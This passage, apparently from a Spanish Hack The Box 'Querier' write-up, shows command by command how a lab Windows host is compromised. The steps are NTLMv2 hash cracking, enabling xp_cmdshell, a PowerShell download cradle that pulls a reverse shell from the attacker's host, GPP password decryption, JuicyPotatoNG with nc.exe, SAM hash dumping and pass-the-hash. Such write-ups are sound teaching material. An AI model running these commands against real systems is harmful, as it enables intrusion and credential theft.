<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
corporate568     <span class="o">(</span>mssql-svc<span class="o">)</span>
1g 0:00:00:42 DONE <span class="o">(</span>2024-04-05 13:48<span class="o">)</span> 0.02369g/s 212247p/s 212247c/s 212247C/s correforenz..corococo
Use the <span class="s2">"--show --format=netntlmv2"</span> options to display all of the cracked passwords reliably
Session completed.
</code></pre></div></div>

<ul>
  <li>Vamos a validar que la contraseña es valida.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.67.247 <span class="nt">-u</span> <span class="s1">'mssql-svc'</span> <span class="nt">-p</span> <span class="s1">'corporate568'</span> <span class="nt">--local-auth</span>
SMB         10.129.67.247   445    QUERIER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:QUERIER<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.67.247   445    QUERIER          <span class="o">[</span>+] QUERIER<span class="se">\m</span>ssql-svc:corporate568
</code></pre></div></div>

<ul>
  <li>Como el usuario se llama <code class="language-plaintext highlighter-rouge">mssql-svc</code> nos podemos conectar a <code class="language-plaintext highlighter-rouge">mssql</code> también.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-mssqlclient WORKGROUP/mssql-svc@10.129.67.247 <span class="nt">-windows-auth</span>
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: master
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: 16192
<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: Changed database context to <span class="s1">'master'</span><span class="nb">.</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: Changed language setting to us_english.
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ACK: Result: 1 - Microsoft SQL Server <span class="o">(</span>140 3232<span class="o">)</span>
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
SQL <span class="o">(</span>QUERIER<span class="se">\m</span>ssql-svc  dbo@master<span class="o">)&gt;</span>
</code></pre></div></div>

<ul>
  <li>Ahora simplemente tenemos que habilitarlo para poder usar el <code class="language-plaintext highlighter-rouge">xp_cmdshell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>QUERIER<span class="se">\m</span>ssql-svc  dbo@master<span class="o">)&gt;</span> xp_cmdshell <span class="s2">"whoami"</span>
<span class="o">[</span>-] ERROR<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: SQL Server blocked access to procedure <span class="s1">'sys.xp_cmdshell'</span> of component <span class="s1">'xp_cmdshell'</span> because this component is turned off as part of the security configuration <span class="k">for </span>this server. A system administrator can <span class="nb">enable </span>the use of <span class="s1">'xp_cmdshell'</span> by using sp_configure. For more information about enabling <span class="s1">'xp_cmdshell'</span>, search <span class="k">for</span> <span class="s1">'xp_cmdshell'</span> <span class="k">in </span>SQL Server Books Online.
</code></pre></div></div>

<ul>
  <li>Vemos que ahora cambia a 1 ya podemos usarlo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>QUERIER<span class="se">\m</span>ssql-svc  dbo@master<span class="o">)&gt;</span> enable_xp_cmdshell
<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 185: Configuration option <span class="s1">'show advanced options'</span> changed from 0 to 1. Run the RECONFIGURE statement to install.
<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 185: Configuration option <span class="s1">'xp_cmdshell'</span> changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL <span class="o">(</span>QUERIER<span class="se">\m</span>ssql-svc  dbo@master<span class="o">)&gt;</span>
</code></pre></div></div>

<ul>
  <li>Ahora ya podemos ejecutar comandos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>QUERIER<span class="se">\m</span>ssql-svc  dbo@master<span class="o">)&gt;</span> xp_cmdshell <span class="s2">"whoami"</span>
output
<span class="nt">-----------------</span>
querier<span class="se">\m</span>ssql-svc

NULL

SQL <span class="o">(</span>QUERIER<span class="se">\m</span>ssql-svc  dbo@master<span class="o">)&gt;</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Ahora podemos ganar acceso ala maquina empleando lo siguiente <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</a>.</p>
  </li>
  <li>
    <p>Vamos a modificar el script para entablarnos una <code class="language-plaintext highlighter-rouge">reverse shell</code> directamente.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">echo</span> <span class="s1">'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.15.11 -Port 443'</span> <span class="o">&gt;&gt;</span> Invoke-PowerShellTcp.ps1
➜  content <span class="nb">cat </span>Invoke-PowerShellTcp.ps1 | <span class="nb">tail</span> <span class="nt">-n</span> 1
Invoke-PowerShellTcp <span class="nt">-Reverse</span> <span class="nt">-IPAddress</span> 10.10.15.11 <span class="nt">-Port</span> 443
</code></pre></div></div>

<ul>
  <li>Vamos a ejecutar un servicio <code class="language-plaintext highlighter-rouge">http</code> con <code class="language-plaintext highlighter-rouge">python3</code> por el puerto <code class="language-plaintext highlighter-rouge">80</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
</code></pre></div></div>

<ul>
  <li>Y ahora nos podemos en escucha por el puerto 443 para que nos llegue la <code class="language-plaintext highlighter-rouge">reverse shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nvlp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<ul>
  <li>Ahora usamos el <code class="language-plaintext highlighter-rouge">xp_cmdshell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>QUERIER<span class="se">\m</span>ssql-svc  dbo@master<span class="o">)&gt;</span> xp_cmdshell <span class="s2">"powershell IEX(New-Object Net.WebClient).downloadString(</span><span class="se">\"</span><span class="s2">http://10.10.15.11/Invoke-PowerShellTcp.ps1</span><span class="se">\"</span><span class="s2">)"</span>
</code></pre></div></div>

<ul>
  <li>Nos llega la <code class="language-plaintext highlighter-rouge">reverse shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nvlp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.15.11] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.67.247] 49677
Windows PowerShell running as user mssql-svc on QUERIER
Copyright <span class="o">(</span>C<span class="o">)</span> 2015 Microsoft Corporation. All rights reserved.

PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
querier<span class="se">\m</span>ssql-svc
PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
e96e197911a391c99a71cd3596542670
PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>

<ul>
  <li>Tenemos el <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> <code class="language-plaintext highlighter-rouge">Enable</code> y podemos usar el <a href="https://github.com/antonioCoco/JuicyPotatoNG">https://github.com/antonioCoco/JuicyPotatoNG</a> para explotarlo pero no es la principal vía para escalar privilegios de la maquina.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers&gt; <span class="nb">whoami</span> /priv

PRIVILEGES INFORMATION
<span class="nt">----------------------</span>

Privilege Name                Description                               State
<span class="o">=============================</span> <span class="o">=========================================</span> <span class="o">========</span>
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas <span class="k">for </span>a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set            </span>Disabled
</code></pre></div></div>

<ul>
  <li>Lo que podemos hacer para enumerar la maquina es usar <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop&gt; curl <span class="nt">-o</span> PowerUp.ps1 10.10.15.11/PowerUp.ps1
PS C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop


Mode                LastWriteTime         Length Name                   
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>                   
<span class="nt">-a----</span>         4/5/2024   9:26 PM         600580 PowerUp.ps1            
<span class="nt">-ar---</span>         4/5/2024   7:41 PM             34 user.txt      
</code></pre></div></div>

<ul>
  <li>Ahora importamos el modulo y lo ejecutamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop&gt; Import-Module .<span class="se">\P</span>owerUp.ps1
PS C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop&gt; Invoke-AllChecks
</code></pre></div></div>

<ul>
  <li>Después de ejecutarse nos da una contraseña para el usuario Administrador.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop&gt; Invoke-AllChecks


Privilege   : SeImpersonatePrivilege
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
TokenHandle : 780
ProcessId   : 4268
Name        : 4268
Check       : Process Token Privileges

ServiceName   : UsoSvc
Path          : C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="se">\s</span>vchost.exe <span class="nt">-k</span> netsvcs <span class="nt">-p</span>
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse <span class="nt">-Name</span> <span class="s1">'UsoSvc'</span>
CanRestart    : True
Name          : UsoSvc
Check         : Modifiable Services

ModifiablePath    : C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\M</span>icrosoft<span class="se">\W</span>indowsApps
IdentityReference : QUERIER<span class="se">\m</span>ssql-svc
Permissions       : <span class="o">{</span>WriteOwner, Delete, WriteAttributes, Synchronize...<span class="o">}</span>
%PATH%            : C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\M</span>icrosoft<span class="se">\W</span>indowsApps
Name              : C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\M</span>icrosoft<span class="se">\W</span>indowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll <span class="nt">-DllPath</span> <span class="s1">'C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'</span>

UnattendPath : C:<span class="se">\W</span>indows<span class="se">\P</span>anther<span class="se">\U</span>nattend.xml
Name         : C:<span class="se">\W</span>indows<span class="se">\P</span>anther<span class="se">\U</span>nattend.xml
Check        : Unattended Install Files

Changed   : <span class="o">{</span>2019-01-28 23:12:48<span class="o">}</span>
UserNames : <span class="o">{</span>Administrator<span class="o">}</span>
NewName   : <span class="o">[</span>BLANK]
Passwords : <span class="o">{</span>MyUnclesAreMarioAndLuigi!!1!<span class="o">}</span>
File      : C:<span class="se">\P</span>rogramData<span class="se">\M</span>icrosoft<span class="se">\G</span>roup
            Policy<span class="se">\H</span>istory<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span><span class="se">\M</span>achine<span class="se">\P</span>references<span class="se">\G</span>roups<span class="se">\G</span>roups.xml
Check     : Cached GPP Files
</code></pre></div></div>

<ul>
  <li>La encontró aquí.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop&gt; <span class="nb">type</span> <span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogramData</span><span class="se">\M</span><span class="s2">icrosoft</span><span class="se">\G</span><span class="s2">roup Policy</span><span class="se">\H</span><span class="s2">istory</span><span class="se">\{</span><span class="s2">31B2F340-016D-11D2-945F-00C04FB984F9}</span><span class="se">\M</span><span class="s2">achine</span><span class="se">\P</span><span class="s2">references</span><span class="se">\G</span><span class="s2">roups</span><span class="se">\G</span><span class="s2">roups.xml"</span>
&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span> ?&gt;&lt;Groups <span class="nv">clsid</span><span class="o">=</span><span class="s2">"{3125E937-EB16-4b4c-9934-544FC6D24D26}"</span><span class="o">&gt;</span>
&lt;User <span class="nv">clsid</span><span class="o">=</span><span class="s2">"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"Administrator"</span> <span class="nv">image</span><span class="o">=</span><span class="s2">"2"</span> <span class="nv">changed</span><span class="o">=</span><span class="s2">"2019-01-28 23:12:48"</span> <span class="nv">uid</span><span class="o">=</span><span class="s2">"{CD450F70-CDB8-4948-B908-F8D038C59B6C}"</span> <span class="nv">userContext</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">removePolicy</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">policyApplied</span><span class="o">=</span><span class="s2">"1"</span><span class="o">&gt;</span>
&lt;Properties <span class="nv">action</span><span class="o">=</span><span class="s2">"U"</span> <span class="nv">newName</span><span class="o">=</span><span class="s2">""</span> <span class="nv">fullName</span><span class="o">=</span><span class="s2">""</span> <span class="nv">description</span><span class="o">=</span><span class="s2">""</span> <span class="nv">cpassword</span><span class="o">=</span><span class="s2">"CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ"</span> <span class="nv">changeLogon</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">noChange</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">neverExpires</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">acctDisabled</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">userName</span><span class="o">=</span><span class="s2">"Administrator"</span><span class="o">&gt;</span>&lt;/Properties&gt;&lt;/User&gt;&lt;/Groups&gt;
PS C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop&gt;
</code></pre></div></div>

<ul>
  <li>Pero si vemos la contraseña esta encriptada y se puede desencriptar con <code class="language-plaintext highlighter-rouge">gpp-decrypt</code> aunque la herramienta ya no la dio en texto plano.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content gpp-decrypt CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ
MyUnclesAreMarioAndLuigi!!1!
</code></pre></div></div>

<ul>
  <li>Vamos a validar la contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.67.247 <span class="nt">-u</span> Administrator <span class="nt">-p</span> <span class="s1">'MyUnclesAreMarioAndLuigi!!1!'</span> <span class="nt">--local-auth</span>
SMB         10.129.67.247   445    QUERIER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:QUERIER<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.67.247   445    QUERIER          <span class="o">[</span>+] QUERIER<span class="se">\A</span>dministrator:MyUnclesAreMarioAndLuigi!!1! <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Gracias al output que nos dan <strong>Pwn3d!</strong> ya nos podemos conectar al servicio <code class="language-plaintext highlighter-rouge">winrm</code> empleando <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.129.67.247 <span class="nt">-u</span> Administrator <span class="nt">-p</span> <span class="s1">'MyUnclesAreMarioAndLuigi!!1!'</span>

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>querier<span class="se">\a</span>dministrator
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<h2 id="root-flag">root flag</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
38f63aa04664d186bccca4c48252e656
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<h2 id="explotando-el-setimpersonateprivilege">Explotando el SetImpersonatePrivilege</h2>

<ul>
  <li>
    <p>Bueno explotar esto es muy fácil ya lo hemos echo muchas veces.</p>
  </li>
  <li>
    <p>Primero necesitamos traer ala maquina el <code class="language-plaintext highlighter-rouge">netcat</code> para Windows para ganar una <code class="language-plaintext highlighter-rouge">reverse shell</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cp</span> /usr/share/seclists/Web-Shells/FuzzDB/nc.exe <span class="nb">.</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop&gt; curl <span class="nt">-o</span> nc.exe 10.10.15.11/nc.exe
PS C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop


Mode                LastWriteTime         Length Name                   
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>                   
<span class="nt">-a----</span>         4/5/2024   9:39 PM          28160 nc.exe                 
<span class="nt">-a----</span>         4/5/2024   9:26 PM         600580 PowerUp.ps1            
<span class="nt">-ar---</span>         4/5/2024   7:41 PM             34 user.txt               


PS C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop&gt; curl <span class="nt">-o</span> JuicyPotatoNG.exe 10.10.15.11/JuicyPotatoNG.exe
PS C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop&gt;
</code></pre></div></div>

<ul>
  <li>
    <p>Ahora nos ponemos en escucha con <code class="language-plaintext highlighter-rouge">rlwrap</code> con lo habíamos hecho antes.</p>
  </li>
  <li>
    <p>Nos enviamos la <code class="language-plaintext highlighter-rouge">reverse shell</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop&gt; .<span class="se">\J</span>uicyPotatoNG.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe <span class="nt">-a</span> <span class="s2">"/c C:</span><span class="se">\U</span><span class="s2">sers</span><span class="se">\m</span><span class="s2">ssql-svc</span><span class="se">\D</span><span class="s2">esktop</span><span class="se">\n</span><span class="s2">c.exe 10.10.15.11 443 -e powershell"</span>
</code></pre></div></div>

<ul>
  <li>Y ahora recibimos la <code class="language-plaintext highlighter-rouge">reverse shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.15.11] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.67.247] 49686
Windows PowerShell
Copyright <span class="o">(</span>C<span class="o">)</span> Microsoft Corporation. All rights reserved.

PS C:<span class="se">\&gt;</span> <span class="nb">whoami
whoami
</span>nt authority<span class="se">\s</span>ystem
PS C:<span class="se">\&gt;</span>
</code></pre></div></div>

<h2 id="dumpeando-los-hashes-ntlm-almacenados-en-la-sam">Dumpeando los hashes NTLM almacenados en la SAM</h2>

<ul>
  <li>Y bueno algo extra es que como tenemos las credenciales del usuario administrador podemos <code class="language-plaintext highlighter-rouge">dumpear</code> los hashes de los demás usuario para hacer <code class="language-plaintext highlighter-rouge">pass the hash</code> y conectarnos sin proporcionar contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.67.247 <span class="nt">-u</span> Administrator <span class="nt">-p</span> <span class="s1">'MyUnclesAreMarioAndLuigi!!1!'</span> <span class="nt">--local-auth</span> <span class="nt">--sam</span>
SMB         10.129.67.247   445    QUERIER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:QUERIER<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.67.247   445    QUERIER          <span class="o">[</span>+] QUERIER<span class="se">\A</span>dministrator:MyUnclesAreMarioAndLuigi!!1! <span class="o">(</span>Pwn3d!<span class="o">)</span>
SMB         10.129.67.247   445    QUERIER          <span class="o">[</span>+] Dumping SAM hashes
SMB         10.129.67.247   445    QUERIER          Administrator:500:aad3b435b51404eeaad3b435b51404ee:2dcefe78334b42c0ce483b8e1b2886ab:::
SMB         10.129.67.247   445    QUERIER          Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.67.247   445    QUERIER          DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.67.247   445    QUERIER          WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5564df813a052fce1f477bf934863870:::
SMB         10.129.67.247   445    QUERIER          mssql-svc:1001:aad3b435b51404eeaad3b435b51404ee:0ac7bd9745e85cbea2fe0fa11f33c588:::
SMB         10.129.67.247   445    QUERIER          reporting:1002:aad3b435b51404eeaad3b435b51404ee:5c8c5434d1c5cfea71d25a364adcc5e8:::
SMB         10.129.67.247   445    QUERIER          <span class="o">[</span>+] Added 6 SAM hashes to the database
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.129.67.247 <span class="nt">-u</span> Administrator <span class="nt">-H</span> 2dcefe78334b42c0ce483b8e1b2886ab

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>querier<span class="se">\a</span>dministrator
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

  </div><a class="u-url" href="/hackthebox/machines/medium/2024/04/09/querier.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <div class="footer-col-wrapper">
      <div class="footer-col">
        <p class="feed-subscribe">
          <a href="http://localhost:4000/feed.xml">
            <svg class="svg-icon orange">
              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
            </svg><span>Subscribe</span>
          </a>
        </p>
        <ul class="contact-list">
          <li class="p-name">MiguelRega7</li>
          
        </ul>
      </div>
      <div class="footer-col">
        <p>Posts sobre resolucion de CTFs y ciberseguridad.
</p>
      </div>
    </div>

    <div class="social-links"><ul class="social-media-list"></ul>
</div>

  </div>

</footer>
</body>

</html>
